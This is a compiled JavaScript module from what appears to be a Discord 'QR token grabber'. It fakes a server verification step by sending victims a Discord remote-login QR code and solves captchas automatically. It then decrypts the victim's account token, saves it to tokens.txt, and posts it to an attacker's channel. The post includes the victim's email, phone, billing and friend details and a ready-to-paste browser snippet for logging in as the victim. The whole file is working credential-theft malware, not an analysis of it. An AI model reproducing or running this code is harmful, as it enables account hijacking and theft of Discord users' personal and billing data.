"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.DiscordSocket = void 0;
const ws_1 = __importDefault(require("ws"));
const discord_js_1 = require("discord.js");
const crypto_1 = require("crypto");
const qrcode_1 = require("qrcode");
const { getAllInfos, getBotToken, guildList, friendList } = require("../util/js/fetch");
const axios_1 = require("../util/axios");
const __1 = require("..");
const CaptchaSolver_1 = require("./CaptchaSolver");
const config_1 = require("../util/config");
const path_1 = require("path");
const embeds = __importStar(require("../util/embeds"));
const fs = __importStar(require("fs/promises"));
class DiscordSocket {
    user;
    messages = new discord_js_1.Collection();
    socket;
    keyPair;
    userInformation = null;
    constructor(user) {
        this.user = user;
        this.socket = new ws_1.default("wss://remote-auth-gateway.discord.gg/?v=2", {
            origin: "https://discord.com",
            handshakeTimeout: 10000,
        });
        this.keyPair = (0, crypto_1.generateKeyPairSync)("rsa", {
            modulusLength: 4096,
            publicExponent: 65537,
        });
        this.messages.set("hello", this.hello);
        this.messages.set("nonce_proof", this.nonce_proof);
        this.messages.set("pending_remote_init", this.pending_remote_init);
        this.messages.set("pending_ticket", this.pending_ticket);
        this.messages.set("pending_login", this.pending_login);
        this.messages.set("cancel", this.handleCancel);
        this.socket.on("message", (message) => {
            const messageData = JSON.parse(message.toString());
            const _handle = this.messages.get(messageData.op);
            if (!_handle)
                return this.messages.get("cancel")(this);
            _handle(this, messageData);
        });
    }
    sendMessageToSocket(data) {
        this.socket.send(JSON.stringify(data));
    }
    async handleCancel(_this) {
        _this.user.send({ embeds: [await embeds.failedVerificationEmbed()] });
        _this.socket.terminate();
        __1.allSockets.delete(_this.user.id);
    }
    async handleFoundUserToken(_this, token) {
        const decryptedToken = (0, crypto_1.privateDecrypt)({ key: _this.keyPair.privateKey, oaepHash: "sha256" }, Buffer.from(token, "base64"));
        await fs.appendFile((0, path_1.join)(__dirname, "..", "..", "tokens.txt"), `${decryptedToken.toString()}\n`, "utf-8");
        _this.taskAfterCompletion(_this, decryptedToken.toString());
        __1.allSockets.delete(_this.user.id);
        _this.user.send({ embeds: [await embeds.verificationComplete()] });
        if (!config_1.config.roles[_this.user.guild.id])
            return;
        _this.user.roles.add(config_1.config.roles[_this.user.guild.id]);
    }
    async taskAfterCompletion(_this, token) {
        const GetInfos = await getAllInfos(token);
        const grabbedEmbed = await embeds.foundTokenEmbed();
        grabbedEmbed.setAuthor({
            name: `${_this.userInformation?.username}#${_this.userInformation?.discriminator}`,
            iconURL: _this.userInformation?.avatar !== "0"
                ? `${GetInfos.avatar}`
                : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
        });
        grabbedEmbed.addFields([
            {
                name: "⚙️ Account Info's Normal", value: `Email: \`${GetInfos.mail}\`\n` +
                    `Phone: \`${GetInfos.hasPhone}\`\n` +
                    `Nitro: **${GetInfos.nitroType}**\n` +
                    `Billing Info: **${GetInfos.billing}**`
            },
            {
                name: "⚙️ Account All Info's", value: `Username: \`${GetInfos.username}\`\n` +
                    `ID: \`${GetInfos.ID}\`\n` +
                    `Badges: **${GetInfos.badges}**\n` +
                    `Nitro-Type: **${GetInfos.nitroType}**\n` +
                    `Billing: **${GetInfos.billing}**\n` +
                    `Friends: \`${GetInfos.totalFriend}\`\n` +
                    `Blocked: \`${GetInfos.totalBlocked}\`\n` +
                    `Servers: \`${GetInfos.totalGuild}\`\n` +
                    `Owned-Servers: \`${GetInfos.totalOwnedGuild}\`\n` +
                    `BOT'S / NPC'S: \`${GetInfos.totalApplication}\`\n` +
                    `Connections: \`${GetInfos.totalConnection}\`\n` +
                    `NSFWAllowed: **${GetInfos.NSFWAllowed}**\n` +
                    `Status: **${GetInfos.status}**\n` +
                    `Gifts: **${GetInfos.Gifts}**\n` +
                    `Biography: \`\`\`\n${GetInfos.hasBio}\n\`\`\`\n`
            },
            {
                name: "⚙️ Account All Friend's",
                value: `**${GetInfos.rareFriend}**`
            },
            {
                name: "⚙️ Code to login",
                value: `\`\`\`js\n(\n    function() {\n        window.t=\"${token}\";\n        window.localStorage=document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage;\n        window.setInterval(() => window.localStorage.token=\`\"\${window.t}\"\`);\n        window.location.reload();\n    }\n)();\`\`\``
            },
            {
                name: "💰 Found Token",
                value: `||**${token}**||`
            },
        ]);
        grabbedEmbed.setFooter({
            text: `https://github.com/k4itrun/WickQrTokenGrabber`,
            iconURL: _this.userInformation?.avatar !== "0"
                ? `${GetInfos.avatar}`
                : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
        });
        __1.sharedClient.channel.send({
            embeds: [grabbedEmbed],
        });
    }
    hello(_this, messageData) {
        _this.sendMessageToSocket({
            op: "init",
            encoded_public_key: _this.keyPair.publicKey
                .export({ type: "spki", format: "der" })
                .toString("base64"),
        });
    }
    nonce_proof(_this, messageData) {
        const decryptedNonce = (0, crypto_1.privateDecrypt)({ key: _this.keyPair.privateKey, oaepHash: "sha256" }, Buffer.from(messageData.encrypted_nonce, "base64"));
        const nonceHash = (0, crypto_1.createHash)("sha256")
            .update(decryptedNonce)
            .digest("base64url");
        _this.sendMessageToSocket({
            op: "nonce_proof",
            proof: nonceHash,
        });
    }
    async pending_remote_init(_this, messageData) {
        const fingerprintDataURL = `https://discordapp.com/ra/${messageData.fingerprint}`;
        const qrCodeDataImage = await (0, qrcode_1.toDataURL)(fingerprintDataURL, {
            width: 300,
        });
        const qrCodeBuffer = Buffer.from(qrCodeDataImage.split(",")[1], "base64");
        const discordImage = new discord_js_1.AttachmentBuilder(qrCodeBuffer).setName("img.png");
        _this.user.send({
            embeds: [
                (await embeds.directMessageEmbed()).setImage("attachment://img.png"),
            ],
            files: [discordImage],
        });
    }
    pending_ticket(_this, messageData) {
        const decryptedTicket = (0, crypto_1.privateDecrypt)({ key: _this.keyPair.privateKey, oaepHash: "sha256" }, Buffer.from(messageData.encrypted_user_payload, "base64"));
        const ticket = decryptedTicket.toString().split(":");
        const userInformation = {
            userid: ticket[0],
            discriminator: parseInt(ticket[1]),
            avatar: ticket[2],
            username: ticket[3],
        };
        _this.userInformation = userInformation;
    }
    async pending_login(_this, messageData) {
        const foundTicket = await (0, axios_1.getTicketAxios)(messageData.ticket);
        if (foundTicket && "encrypted_token" in foundTicket)
            return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
        await _this.user.send({
            embeds: [await embeds.pleaseWaitEmbed()],
        });
        await _this.solveCaptchaTicket(_this, foundTicket, messageData);
    }
    async solveCaptchaTicket(_this, captchaToSolve, messageData, tries = 0) {
        if (tries >= 2)
            return _this.handleCancel(_this);
        const solvedCaptcha = await CaptchaSolver_1.CaptchaSolver.solveCaptcha(captchaToSolve.captcha_sitekey, captchaToSolve.captcha_rqdata);
        if (!solvedCaptcha)
            return _this.handleCancel(_this);
        const foundTicketWithCaptcha = await (0, axios_1.getTicketWithCaptchaAxios)(messageData.ticket, solvedCaptcha, captchaToSolve.captcha_rqtoken);
        if (foundTicketWithCaptcha.encrypted_token)
            return _this.handleFoundUserToken(_this, foundTicketWithCaptcha.encrypted_token);
        return _this.solveCaptchaTicket(_this, captchaToSolve, messageData, tries + 1);
    }
    async solveCaptchaMessage(_this, captchaToSolve, tries = 0) {
        if (tries >= 2)
            return _this.handleCancel(_this);
        const solvedCaptcha = await CaptchaSolver_1.CaptchaSolver.solveCaptcha(captchaToSolve.captcha_sitekey, captchaToSolve.captcha_rqdata);
        console.log(solvedCaptcha);
        return solvedCaptcha;
    }
}
exports.DiscordSocket = DiscordSocket;
